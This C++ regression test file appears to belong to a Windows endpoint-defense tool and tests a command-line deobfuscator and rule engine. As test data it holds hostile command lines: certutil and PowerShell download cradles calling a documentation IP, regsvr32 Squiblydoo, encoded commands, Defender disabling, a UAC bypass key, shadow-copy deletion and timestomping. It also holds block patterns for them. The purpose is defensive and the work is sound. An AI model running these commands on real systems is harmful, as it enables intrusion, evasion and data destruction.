// 命令行还原的回归测试,按重要性钉住三件事:
//   1) 不得制造误报:正常命令行必须原样返回(normalized 为空)。
//   2) 不得被用来绕过:放行规则永远只看原文。
//   3) 混淆不降级处置:同一个行为,混淆写法与干净写法必须拿到同一个裁决。

#include "bulwark/Clock.h"
#include "bulwark/engine/AmsiScanPolicy.h"
#include "bulwark/engine/CommandDeobfuscator.h"
#include "bulwark/engine/DefaultRules.h"
#include "bulwark/engine/RuleEngine.h"
#include "bulwark/models/DefenseRule.h"
#include "bulwark/models/SecurityEvent.h"
#include "bulwark/models/Verdict.h"

#include <QCoreApplication>
#include <QDateTime>
#include <QElapsedTimer>
#include <QString>
#include <QTextStream>
#include <QTimeZone>

using namespace bulwark;
using namespace bulwark::engine;

namespace {

QTextStream& out()
{
    static QTextStream s(stdout);
    s.setEncoding(QStringConverter::Utf8);
    return s;
}

int g_failed = 0;
int g_checked = 0;

void expect(bool ok, const QString& what)
{
    ++g_checked;
    if (ok)
        return;
    ++g_failed;
    out() << "FAIL  " << what << "\n";
    out().flush();
}

QString actionName(VerdictAction a)
{
    switch (a) {
        case VerdictAction::Block: return QStringLiteral("Block");
        case VerdictAction::Ask:   return QStringLiteral("Ask");
        default:                   return QStringLiteral("Allow");
    }
}

QDateTime fixedNow()
{
    return QDateTime(QDate(2026, 3, 1), QTime(12, 0, 0), QTimeZone::UTC);
}

// 1) 还原器自身的行为

void checkNormalizesTo(const QString& input, const QString& expected, const QString& what)
{
    const CommandDeobfuscator::Result r = CommandDeobfuscator::run(input);
    const bool ok = r.normalized == expected;
    expect(ok, what + QStringLiteral("  期望 \"") + expected
                   + QStringLiteral("\",实际 \"") + r.normalized + QStringLiteral("\""));
}

void checkUnchanged(const QString& input, const QString& what)
{
    const CommandDeobfuscator::Result r = CommandDeobfuscator::run(input);
    expect(r.normalized.isEmpty(),
           what + QStringLiteral("  正常命令行被改写成了 \"") + r.normalized
               + QStringLiteral("\"(原文 \"") + input + QStringLiteral("\")"));
}

void testDeobfuscator()
{
    // cmd 的 ^ 转义
    checkNormalizesTo(QStringLiteral("p^o^w^e^r^s^h^e^l^l -nologo"),
                      QStringLiteral("powershell -nologo"),
                      QStringLiteral("caret: 逐字符 ^ 转义"));
    checkNormalizesTo(QStringLiteral("certutil.exe -u^r^l^c^a^c^h^e -split -f http://a/b.exe"),
                      QStringLiteral("certutil.exe -urlcache -split -f http://a/b.exe"),
                      QStringLiteral("caret: 只混淆参数名"));

    // PowerShell 的 ` 转义
    checkNormalizesTo(QStringLiteral("i`e`x (gc a.txt)"),
                      QStringLiteral("iex (gc a.txt)"),
                      QStringLiteral("backtick: i`e`x"));
    checkNormalizesTo(QStringLiteral("Invoke-Expre`ssion $p"),
                      QStringLiteral("Invoke-Expression $p"),
                      QStringLiteral("backtick: 单个反引号也要还原"));
    checkNormalizesTo(QStringLiteral("whoami`nhostname"),
                      QStringLiteral("whoami hostname"),
                      QStringLiteral("backtick: `n 是真换行,按空白还原"));

    // 字符串拼接与词内引号
    checkNormalizesTo(QStringLiteral("[Convert]::\"From\"+\"Base64String\"($b)"),
                      QStringLiteral("[Convert]::FromBase64String($b)"),
                      QStringLiteral("concat: \"a\"+\"b\""));
    checkNormalizesTo(QStringLiteral("w\"h\"oami /priv"),
                      QStringLiteral("whoami /priv"),
                      QStringLiteral("concat: 词内引号"));
    checkNormalizesTo(QStringLiteral("i''ex $payload"),
                      QStringLiteral("iex $payload"),
                      QStringLiteral("concat: 空字面量插入"));

    // [char] 字符码
    checkNormalizesTo(QStringLiteral("[char]105+[char]101+[char]120 $p"),
                      QStringLiteral("iex $p"),
                      QStringLiteral("char: 十进制字符码拼接"));

    // -f 格式化重排
    checkNormalizesTo(QStringLiteral("('{1}{0}' -f 'ex','i') $p"),
                      QStringLiteral("(iex) $p"),
                      QStringLiteral("format: -f 占位符重排"));

    // Base64 正文独立成块,不拼回命令行
    {
        // UTF-16LE 的 "IEX(New-Object Net.WebClient).DownloadString"
        const QString b64 = QStringLiteral(
            "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4A"
            "RABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnAA==");
        const CommandDeobfuscator::Result r =
            CommandDeobfuscator::run(QStringLiteral("powershell -nop -w hidden -e^n^c ") + b64);
        expect(r.normalized == QStringLiteral("powershell -nop -w hidden -enc ") + b64,
               QStringLiteral("base64: 还原出 -enc 这个词,实际 \"") + r.normalized
                   + QStringLiteral("\""));
        expect(r.decodedBlocks.size() == 1
                   && r.decodedBlocks.at(0).contains(QStringLiteral("DownloadString")),
               QStringLiteral("base64: UTF-16LE 正文解码成独立块"));
        expect(!r.normalized.contains(QStringLiteral("DownloadString")),
               QStringLiteral("base64: 解码正文不得拼回命令行"));
    }

    // 二进制 / 乱码不得进入匹配面
    {
        const CommandDeobfuscator::Result r = CommandDeobfuscator::run(
            QStringLiteral("p^o^w^e^r^s^h^e^l^l -enc //////////////////7+/v7+/v7+/g=="));
        expect(r.decodedBlocks.isEmpty(),
               QStringLiteral("base64: 解不出可读文本的要丢弃"));
    }

    // 超长输入不还原(热路径必须有界)
    {
        const QString huge = QStringLiteral("a^b").repeated(CommandDeobfuscator::kMaxInputChars);
        const CommandDeobfuscator::Result r = CommandDeobfuscator::run(huge);
        expect(r.normalized.isEmpty() && r.decodedBlocks.isEmpty(),
               QStringLiteral("bound: 超过 kMaxInputChars 的命令行不还原"));
    }
}

// 1b) 误报哨兵:正常命令行必须逐字不变

void testNoFalseRewrite()
{
    const QStringList benign = {
        QStringLiteral("\"C:\\Program Files\\Git\\bin\\git.exe\" commit -m \"fix: 修正 a+b\""),
        QStringLiteral("cmake --build . --config Release --target bulwark_shared"),
        QStringLiteral("powershell.exe -NoProfile -ExecutionPolicy RemoteSigned -File \"C:\\x\\b.ps1\""),
        QStringLiteral("msbuild /p:Configuration=Release /p:Platform=x64 App.sln"),
        QStringLiteral("robocopy \"D:\\a b\" \"E:\\c d\" /MIR /R:1 /W:1"),
        QStringLiteral("curl -s \"https://example.com/api?a=1&b=2\" -o out.json"),
        QStringLiteral("python -c \"print(1+2)\""),
        QStringLiteral("cl.exe /W4 /permissive- /utf-8 /DUNICODE main.cpp"),
        QStringLiteral("7z.exe a -tzip out.zip \"C:\\data\\*\" -mx=9"),
        QStringLiteral("schtasks /Create /TN Backup /TR \"C:\\tools\\backup.exe\" /SC DAILY"),
        QStringLiteral("node server.js --port=8080 --host=127.0.0.1"),
        QStringLiteral("ffmpeg -i in.mp4 -c:v libx264 -b:v 2M out.mp4"),
    };
    for (const QString& c : benign)
        checkUnchanged(c, QStringLiteral("fp-unchanged"));

    // 带 ^ 和引号、但不是混淆的真实写法。还原器可能会动它们(^ 紧跟字母数字就是它的判据),
    // 所以这里只要求:还原结果仍然是同一条命令的等价文本,不得凭空长出新 token。
    {
        const CommandDeobfuscator::Result r =
            CommandDeobfuscator::run(QStringLiteral("findstr /r /c:\"^ERROR\" build.log"));
        expect(r.normalized.isEmpty()
                   || (r.normalized.contains(QStringLiteral("findstr"))
                       && r.normalized.contains(QStringLiteral("build.log"))
                       && !r.normalized.contains(QStringLiteral("iex"))),
               QStringLiteral("fp: findstr 正则锚点还原后仍是同一条命令,实际 \"")
                   + r.normalized + QStringLiteral("\""));
    }
}

// 2) 放行规则不得被还原文本放宽

void testAllowRuleNotWidened()
{
    SecurityEvent e;
    e.type = EventType::ProcessCreate;
    e.actorPath = QStringLiteral("C:\\Users\\u\\AppData\\Local\\Temp\\x.exe");
    e.commandLine = QStringLiteral("p^o^w^e^r^s^h^e^l^l -nologo -c whoami");

    const CommandDeobfuscator::Result d = CommandDeobfuscator::run(e.commandLine);
    e.normalizedCommandLine = d.normalized;
    e.decodedCommandBlocks = d.decodedBlocks;
    expect(!e.normalizedCommandLine.isEmpty(),
           QStringLiteral("前提: 这条命令行确实被还原了"));

    DefenseRule base;
    base.commandLinePattern = QStringLiteral("*powershell -nologo*");

    DefenseRule allow = base;
    allow.action = VerdictAction::Allow;
    expect(!allow.matches(e),
           QStringLiteral("放行规则只看原文:还原后命中也不得放行(否则是一条绕过通道)"));

    DefenseRule block = base;
    block.id = QUuid::createUuid();
    block.action = VerdictAction::Block;
    expect(block.matches(e),
           QStringLiteral("拦截规则吃还原文本:混淆写法必须照样命中"));

    DefenseRule ask = base;
    ask.id = QUuid::createUuid();
    ask.action = VerdictAction::Ask;
    expect(ask.matches(e), QStringLiteral("询问规则吃还原文本"));

    // 原文本来就命中时,放行规则照常生效:还原不得缩小放行面。
    SecurityEvent clean = e;
    clean.commandLine = QStringLiteral("powershell -nologo -c whoami");
    clean.normalizedCommandLine.clear();
    expect(allow.matches(clean),
           QStringLiteral("放行规则对原文照常生效(不得因本改动缩小放行面)"));

    // 解码正文同样只喂给 Block / Ask。
    SecurityEvent dec;
    dec.type = EventType::ProcessCreate;
    dec.commandLine = QStringLiteral("powershell -enc AAAA");
    dec.decodedCommandBlocks = QStringList{ QStringLiteral("powershell -nologo -c whoami") };
    expect(!allow.matches(dec), QStringLiteral("放行规则不吃 Base64 解码正文"));
    expect(block.matches(dec), QStringLiteral("拦截规则吃 Base64 解码正文"));
}

// 3) 端到端:混淆写法与干净写法拿到同一个裁决

SecurityEvent makeProc(const QString& actorPath, const QString& cmd, bool signed_,
                       const QString& publisher)
{
    SecurityEvent e;
    e.timestampUtc = fixedNow();
    e.type = EventType::ProcessCreate;
    e.actorPid = 4242;
    e.actorPath = actorPath;
    e.commandLine = cmd;
    e.target = actorPath.section(QLatin1Char('\\'), -1);
    e.parentPath = QStringLiteral("C:\\Windows\\explorer.exe");
    e.parentPid = 1000;
    e.actorSigned = signed_;
    e.actorPublisher = publisher;
    e.actorFileSize = 64 * 1024;
    return e;
}

QVector<DefenseRule> parityRules()
{
    const auto block = [](const char* pattern) {
        DefenseRule r;
        r.id = QUuid::createUuid();
        r.type = EventType::ProcessCreate;
        r.action = VerdictAction::Block;
        r.commandLinePattern = QString::fromUtf8(pattern);
        r.note = QStringLiteral("测试规则 ") + r.commandLinePattern;
        return r;
    };
    return {
        block("*certutil*-urlcache*"),
        block("*regsvr32*/i:http*scrobj*"),
        block("*iex(new-object net.webclient).downloadstring*"),
        block("*frombase64string*"),
        block("*-enc *"),
        block("*vssadmin*delete shadows*"),
    };
}

void testVerdictParity()
{
    struct Pair {
        QString what;
        QString actorPath;
        QString clean;
        QString obfuscated;
        bool    signed_ = true;
        QString publisher = QStringLiteral("Microsoft Corporation");
    };

    const QString sys = QStringLiteral("C:\\Windows\\System32\\");
    const QString b64 = QStringLiteral(
        "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4A"
        "RABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnAA==");

    const QVector<Pair> pairs = {
        { QStringLiteral("certutil 远程下载(^ 转义)"),
          sys + QStringLiteral("certutil.exe"),
          QStringLiteral("certutil.exe -urlcache -split -f http://198.51.100.7/p.exe C:\\p.exe"),
          QStringLiteral("c^e^r^t^u^t^i^l.exe -u^r^l^c^a^c^h^e -split -f http://198.51.100.7/p.exe C:\\p.exe"),
          true, QStringLiteral("Microsoft Corporation") },

        { QStringLiteral("regsvr32 Squiblydoo(^ 转义)"),
          sys + QStringLiteral("regsvr32.exe"),
          QStringLiteral("regsvr32.exe /s /n /u /i:http://198.51.100.7/a.sct scrobj.dll"),
          QStringLiteral("regsvr32.exe /s /n /u /i^:http^:^/^/198.51.100.7/a.sct scrobj.dll"),
          true, QStringLiteral("Microsoft Corporation") },

        { QStringLiteral("PowerShell 内存下载执行(` 转义)"),
          sys + QStringLiteral("WindowsPowerShell\\v1.0\\powershell.exe"),
          QStringLiteral("powershell.exe -nop -w hidden -c \"iex(New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')\""),
          QStringLiteral("powershell.exe -nop -w hidden -c \"i`e`x(New-Object Net.We`bClient).Downlo`adString('http://198.51.100.7/a')\""),
          true, QStringLiteral("Microsoft Corporation") },

        { QStringLiteral("反射加载 + Base64(字符串拼接)"),
          sys + QStringLiteral("WindowsPowerShell\\v1.0\\powershell.exe"),
          QStringLiteral("powershell.exe -c \"[Reflection.Assembly]::Load([Convert]::FromBase64String($e))\""),
          QStringLiteral("powershell.exe -c \"[Reflection.Assembly]::Load([Convert]::\"From\"+\"Base64String\"($e))\""),
          true, QStringLiteral("Microsoft Corporation") },

        { QStringLiteral("编码命令(-enc 被 ^ 拆开)"),
          sys + QStringLiteral("WindowsPowerShell\\v1.0\\powershell.exe"),
          QStringLiteral("powershell.exe -nop -w hidden -enc ") + b64,
          QStringLiteral("powershell.exe -nop -w hidden -e^n^c ") + b64,
          true, QStringLiteral("Microsoft Corporation") },

        { QStringLiteral("vssadmin 删除卷影(^ 转义)"),
          sys + QStringLiteral("vssadmin.exe"),
          QStringLiteral("vssadmin.exe delete shadows /all /quiet"),
          QStringLiteral("v^s^s^a^d^m^i^n.exe delete shadows /all /quiet"),
          true, QStringLiteral("Microsoft Corporation") },
    };

    for (const Pair& p : pairs) {
        RuleEngine engine;
        engine.loadRules(parityRules());
        SecurityEvent a = makeProc(p.actorPath, p.clean, p.signed_, p.publisher);
        const Verdict va = engine.evaluate(a);

        RuleEngine engine2;
        engine2.loadRules(parityRules());
        SecurityEvent b = makeProc(p.actorPath, p.obfuscated, p.signed_, p.publisher);
        const Verdict vb = engine2.evaluate(b);

        // 先确认干净写法本来就被处置,否则下面的"相等"是空话。
        expect(va.action != VerdictAction::Allow,
               QStringLiteral("前提: 干净写法应被处置 —— ") + p.what
                   + QStringLiteral("(实际 ") + actionName(va.action) + QStringLiteral(")"));

        expect(va.action == vb.action,
               QStringLiteral("混淆不得降级处置 —— ") + p.what
                   + QStringLiteral(":干净 ") + actionName(va.action)
                   + QStringLiteral(" vs 混淆 ") + actionName(vb.action));

        expect(b.hasThreatIndicator == a.hasThreatIndicator,
               QStringLiteral("混淆不得丢掉硬指标 —— ") + p.what);

        expect(!b.normalizedCommandLine.isEmpty() || !b.decodedCommandBlocks.isEmpty(),
               QStringLiteral("混淆写法应被还原 —— ") + p.what);
    }
}

// 3b) 端到端误报哨兵:正常命令行不得变成 Block

void testEndToEndNoFalsePositive()
{
    struct Case { QString actorPath; QString cmd; bool signed_; QString publisher; };
    const QVector<Case> cases = {
        { QStringLiteral("C:\\Program Files\\Git\\cmd\\git.exe"),
          QStringLiteral("git.exe commit -m \"fix: a+b 拼接\""), true,
          QStringLiteral("Johannes Schindelin") },
        { QStringLiteral("C:\\Windows\\System32\\findstr.exe"),
          QStringLiteral("findstr /r /c:\"^ERROR\" C:\\logs\\build.log"), true,
          QStringLiteral("Microsoft Corporation") },
        { QStringLiteral("C:\\Windows\\System32\\robocopy.exe"),
          QStringLiteral("robocopy \"D:\\a b\" \"E:\\c d\" /MIR /R:1 /W:1"), true,
          QStringLiteral("Microsoft Corporation") },
        { QStringLiteral("C:\\Users\\u\\AppData\\Local\\Programs\\Python\\python.exe"),
          QStringLiteral("python -c \"print('a'+'b')\""), false, QString() },
        { QStringLiteral("C:\\Users\\u\\AppData\\Local\\Temp\\installer_helper.exe"),
          QStringLiteral("installer_helper.exe /S /D=\"C:\\Program Files\\App\""), false, QString() },
        { QStringLiteral("C:\\Windows\\System32\\cmd.exe"),
          QStringLiteral("cmd.exe /c echo a^&b > out.txt"), true,
          QStringLiteral("Microsoft Corporation") },
    };

    for (const Case& c : cases) {
        RuleEngine engine;
        QVector<DefenseRule> rules = parityRules();
        rules += DefaultRules::build();
        engine.loadRules(rules);
        SecurityEvent e = makeProc(c.actorPath, c.cmd, c.signed_, c.publisher);
        const Verdict v = engine.evaluate(e);
        expect(v.action != VerdictAction::Block,
               QStringLiteral("fp-e2e: 正常命令行不得被拦 —— ") + c.cmd
                   + QStringLiteral("(实际 ") + actionName(v.action)
                   + QStringLiteral(",还原 \"") + e.normalizedCommandLine
                   + QStringLiteral("\")"));
    }
}

// 规则边界(误报回归)
// 每组都是「正常写法不拦 + 对应的攻击写法照拦」:只测前一半,规则改宽了也看不出来。
const QVector<DefenseRule>& builtinRules()
{
    static const QVector<DefenseRule> rules = DefaultRules::build();
    return rules;
}

Verdict evaluateBuiltin(SecurityEvent& e)
{
    RuleEngine engine;
    QVector<DefenseRule> rules = builtinRules();
    engine.loadRules(rules);
    return engine.evaluate(e);
}

SecurityEvent makeFileWrite(const QString& actorPath, const QString& target)
{
    SecurityEvent e = makeProc(actorPath, QString(), false, QString());
    e.type = EventType::FileWrite;
    e.target = target;
    return e;
}

QString verdictText(const Verdict& v, const SecurityEvent& e)
{
    return QStringLiteral("(实际 ") + actionName(v.action) + QStringLiteral(",命中「") + e.matchedRuleNote
           + QStringLiteral("」)");
}

void testRuleBoundaries()
{
    const QString ps = QStringLiteral("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
    const QString cmd = QStringLiteral("C:\\Windows\\System32\\cmd.exe");
    const QString schtasks = QStringLiteral("C:\\Windows\\System32\\schtasks.exe");
    const QString ms = QStringLiteral("Microsoft Windows");

    struct Case {
        QString actor;
        QString cmdLine;
        bool mustBlock;
        const char* what;
    };
    const Case cases[] = {
        { ps, QStringLiteral("powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring $false "
                             "-SignatureUpdateInterval 1\""),
          false, "重新开启 Defender,后面别的参数带 1" },
        { ps, QStringLiteral("powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\""),
          true, "关闭 Defender 实时防护" },
        { ps, QStringLiteral("powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring:1\""),
          true, "关闭 Defender 实时防护(冒号写法)" },
        { cmd, QStringLiteral("cmd.exe /c whoami /priv | findstr SeDebugPrivilege"),
          false, "只查询 SeDebugPrivilege" },
        { cmd, QStringLiteral("cmd.exe /c reg query HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command"),
          false, "只读查询 UAC 绕过键" },
        { cmd, QStringLiteral("cmd.exe /c reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command "
                              "/ve /d cmd.exe /f"),
          true, "写入 UAC 绕过键" },
        { cmd, QStringLiteral("cmd.exe /c sc stop MyAppSvc && type license.txt"),
          false, "停别的服务、后面出现 license" },
        { cmd, QStringLiteral("cmd.exe /c sc stop Sense"),
          true, "停 Defender ATP 服务 Sense" },
        { ps, QStringLiteral("\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Command "
                             "\"(Get-Item 'D:\\Photos\\a.jpg').LastWriteTime = '2015-01-01'\""),
          false, "照片按拍摄日期回写时间戳" },
        { ps, QStringLiteral("powershell.exe -Command \"(Get-Item 'C:\\Tools\\a.exe').LastWriteTime = '2015-01-01'\""),
          true, "把程序的时间戳改成过去日期" },
        { schtasks, QStringLiteral("schtasks.exe /query /tn \"MicrosoftEdgeUpdateTaskMachineCore-Task-S-1-5-18\""),
          false, "查询带 SYSTEM SID 的任务名" },
        { schtasks, QStringLiteral("schtasks.exe /create /tn \"MicrosoftEdgeUpdateTaskMachineCore-Task-S-1-5-18\" "
                                   "/tr C:\\Users\\Public\\u.exe /sc onlogon"),
          true, "创建伪装 Edge 更新的计划任务" },
        { QStringLiteral("C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\MSBuild\\Current\\Bin\\amd64\\MSBuild.exe"),
          QStringLiteral("MSBuild.exe D:\\src\\app\\app.sln /p:Configuration=Release"),
          false, "VS 自带的 MSBuild 构建本地项目" },
    };
    for (const Case& c : cases) {
        SecurityEvent e = makeProc(c.actor, c.cmdLine, true, ms);
        const Verdict v = evaluateBuiltin(e);
        expect((v.action == VerdictAction::Block) == c.mustBlock,
               QStringLiteral("rule-boundary: ") + QString::fromUtf8(c.what)
                   + (c.mustBlock ? QStringLiteral(" 应拦") : QStringLiteral(" 不该拦")) + verdictText(v, e));
    }

    // 下面几处原本就是询问,误报表现为弹窗而不是拦截:看命中的是哪条。
    {
        SecurityEvent e = makeProc(ps, QStringLiteral("powershell.exe -Command \"choco install nodejs --version 20.11.0 -y\""),
                                   true, ms);
        const Verdict v = evaluateBuiltin(e);
        expect(!e.matchedRuleNote.contains(QStringLiteral("降级到 2.0")),
               QStringLiteral("rule-boundary: choco 的 --version 20.x 不是 PowerShell 降级") + verdictText(v, e));
        SecurityEvent d = makeProc(ps, QStringLiteral("powershell.exe -Version 2 -Command \"whoami\""), true, ms);
        const Verdict vd = evaluateBuiltin(d);
        expect(d.matchedRuleNote.contains(QStringLiteral("降级到 2.0")),
               QStringLiteral("rule-boundary: -Version 2 仍按降级询问") + verdictText(vd, d));
    }
    {
        SecurityEvent e = makeProc(schtasks,
                                   QStringLiteral("schtasks.exe /create /tn Backup /tr \"powershell -File "
                                                  "C:\\Jobs\\backup.ps1 -Encoding UTF8\" /sc daily"),
                                   true, ms);
        const Verdict v = evaluateBuiltin(e);
        expect(!e.matchedRuleNote.contains(QStringLiteral("编码命令")),
               QStringLiteral("rule-boundary: 计划任务里的 -Encoding UTF8 不是编码命令") + verdictText(v, e));
    }
    {
        SecurityEvent e = makeProc(ps, QStringLiteral("powershell.exe -Command \"Set-MpPreference -ExclusionPath C:\\Tools\""),
                                   true, ms);
        const Verdict v = evaluateBuiltin(e);
        expect(v.action != VerdictAction::Allow,
               QStringLiteral("rule-boundary: Set-MpPreference 加排除项要问") + verdictText(v, e));
    }
    {
        SecurityEvent e = makeProc(QStringLiteral("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"),
                                   QStringLiteral("MSBuild.exe C:\\Users\\u\\Downloads\\x.csproj"), true,
                                   QStringLiteral("Microsoft Corporation"));
        const Verdict v = evaluateBuiltin(e);
        expect(v.action != VerdictAction::Allow,
               QStringLiteral("rule-boundary: 系统 MSBuild 构建下载目录里的项目要问") + verdictText(v, e));
    }

    // 7-Zip 没有签名:解压到以动漫角色命名的模组目录不拦,文件名本身是家族名才拦。
    {
        const QString sevenZip = QStringLiteral("C:\\Program Files\\7-Zip\\7zG.exe");
        SecurityEvent mod = makeFileWrite(sevenZip, QStringLiteral("D:\\Games\\Ryuk Mod\\launcher.exe"));
        const Verdict vm = evaluateBuiltin(mod);
        expect(vm.action != VerdictAction::Block,
               QStringLiteral("rule-boundary: 解压到 Ryuk 模组目录不该拦") + verdictText(vm, mod));
        SecurityEvent bad = makeFileWrite(sevenZip, QStringLiteral("D:\\Games\\Ryuk Mod\\ryuk.exe"));
        const Verdict vb = evaluateBuiltin(bad);
        expect(vb.action == VerdictAction::Block,
               QStringLiteral("rule-boundary: 投放 ryuk.exe 应拦") + verdictText(vb, bad));
    }

    // 规则要求签名程序也得问时,签名的开发工具同样不自动放行。
    for (const bool noSignedAutoAllow : { false, true }) {
        DefenseRule r;
        r.id = QUuid::createUuid();
        r.note = QStringLiteral("测试:开发工具询问");
        r.type = EventType::ProcessCreate;
        r.actorPattern = QStringLiteral("*\\python.exe");
        r.action = VerdictAction::Ask;
        r.disableSignedAutoAllow = noSignedAutoAllow;
        RuleEngine engine;
        QVector<DefenseRule> rules{ r };
        engine.loadRules(rules);
        SecurityEvent e = makeProc(QStringLiteral("C:\\Users\\u\\AppData\\Local\\Programs\\Python\\Python312\\python.exe"),
                                   QStringLiteral("python.exe tool.py"), true,
                                   QStringLiteral("Python Software Foundation"));
        const Verdict v = engine.evaluate(e);
        const VerdictAction want = noSignedAutoAllow ? VerdictAction::Ask : VerdictAction::Allow;
        expect(v.action == want,
               QStringLiteral("dev-tool: 签名的 python ")
                   + (noSignedAutoAllow ? QStringLiteral("遇到不免问的规则仍要问")
                                        : QStringLiteral("遇到普通询问规则自动放行"))
                   + verdictText(v, e));
    }

    // AMSI 是同步拦截,没有询问的余地:关键词必须落在词首、同一条命令里。
    const auto amsiBlocks = [](const char* script) { return amsiShouldBlock(QString::fromUtf8(script)).block; };
    expect(!amsiBlocks("Write-Host 'Please confirm the target'; $sb = [scriptblock]::Create($code); "
                       "$psi.CreateNoWindow = $true"),
           QStringLiteral("amsi: confirm 里的 irm 不算下载"));
    expect(amsiBlocks("$psi.CreateNoWindow = $true; iex (irm 'http://198.51.100.7/a.ps1')"),
           QStringLiteral("amsi: irm 下载 + iex + 隐藏窗口照拦"));
    expect(!amsiBlocks("vssadmin delete shadows /for=c: /oldest /quiet\nInstall-Module Foo -AllowClobber"),
           QStringLiteral("amsi: 只删最旧卷影、别处出现 -AllowClobber 不拦"));
    expect(amsiBlocks("cmd /c vssadmin delete shadows /all /quiet"),
           QStringLiteral("amsi: 删除全部卷影照拦"));
}

// 微基准(--bench,ctest 不跑)
// 直接测 CommandDeobfuscator::run 的单次成本,再与引擎每事件成本相比:
// 整条流水线的 A/B(bulwark_snapshot --bench)噪声太大,分辨不出几微秒的增量。
int benchmark()
{
    const QStringList samples = {
        // 绝大多数真实命令行都不含转义/拼接,走的是"原样返回"这条快路径 —— 它的成本
        // 才是生产环境里实际付出的那一份。
        QStringLiteral("\"C:\\Program Files\\Git\\bin\\git.exe\" commit -m \"fix\""),
        QStringLiteral("cmake --build . --config Release --parallel"),
        QStringLiteral("powershell.exe -NoProfile -ExecutionPolicy RemoteSigned -File \"C:\\x\\b.ps1\""),
        QStringLiteral("svchost.exe -k netsvcs -p"),
        QStringLiteral("\"C:\\Windows\\System32\\cmd.exe\" /c dir /b"),
        QStringLiteral("msedge.exe --type=renderer --lang=zh-CN --device-scale-factor=1"),
        // 需要真还原的那一档
        QStringLiteral("c^e^r^t^u^t^i^l.exe -u^r^l^c^a^c^h^e -split -f http://198.51.100.7/p.exe C:\\p.exe"),
        QStringLiteral("powershell -c \"i`e`x(New-Object Net.We`bClient).Downlo`adString('http://a/b')\""),
        QStringLiteral("powershell -c \"[Convert]::\"From\"+\"Base64String\"($e)\""),
        QStringLiteral("powershell -nop -w hidden -e^n^c "
                       "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4A"
                       "RABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnAA=="),
    };

    constexpr int kRounds = 2000;
    qint64 best = -1;
    qsizetype sink = 0;
    for (int iter = 0; iter < 7; ++iter) {
        QElapsedTimer t;
        t.start();
        for (int r = 0; r < kRounds; ++r)
            for (const QString& s : samples) {
                const CommandDeobfuscator::Result res = CommandDeobfuscator::run(s);
                sink += res.normalized.size() + res.decodedBlocks.size();
            }
        const qint64 ns = t.nsecsElapsed();
        if (best < 0 || ns < best)
            best = ns;
    }
    const qint64 calls = static_cast<qint64>(kRounds) * samples.size();

    // 快路径单独计一次:生产环境里绝大多数命令行落在这一档。
    qint64 bestFast = -1;
    const QStringList fast = samples.mid(0, 6);
    for (int iter = 0; iter < 7; ++iter) {
        QElapsedTimer t;
        t.start();
        for (int r = 0; r < kRounds; ++r)
            for (const QString& s : fast) {
                const CommandDeobfuscator::Result res = CommandDeobfuscator::run(s);
                sink += res.normalized.size();
            }
        const qint64 ns = t.nsecsElapsed();
        if (bestFast < 0 || ns < bestFast)
            bestFast = ns;
    }
    const qint64 fastCalls = static_cast<qint64>(kRounds) * fast.size();

    out() << "CommandDeobfuscator::run  取 7 次中最快一次\n"
          << "  混合样本(6 条正常 + 4 条需还原): "
          << QString::number(double(best) / double(calls) / 1000.0, 'f', 3) << " us/call\n"
          << "  仅正常命令行(原样返回快路径): "
          << QString::number(double(bestFast) / double(fastCalls) / 1000.0, 'f', 3) << " us/call\n"
          << "  (校验和 " << sink << ",防止调用被优化掉)\n";
    out().flush();
    return 0;
}

}

int main(int argc, char** argv)
{
    QCoreApplication app(argc, argv);

    for (int i = 1; i < argc; ++i) {
        if (QString::fromLocal8Bit(argv[i]) == QLatin1String("--bench"))
            return benchmark();
    }

    setFixedNowUtcForTest(fixedNow());

    testDeobfuscator();
    testNoFalseRewrite();
    testAllowRuleNotWidened();
    testVerdictParity();
    testEndToEndNoFalsePositive();
    testRuleBoundaries();

    setFixedNowUtcForTest(QDateTime());

    out() << (g_failed == 0 ? "OK  " : "FAILED  ") << g_checked << " 项断言,"
          << g_failed << " 项失败\n";
    out().flush();
    return g_failed == 0 ? 0 : 1;
}
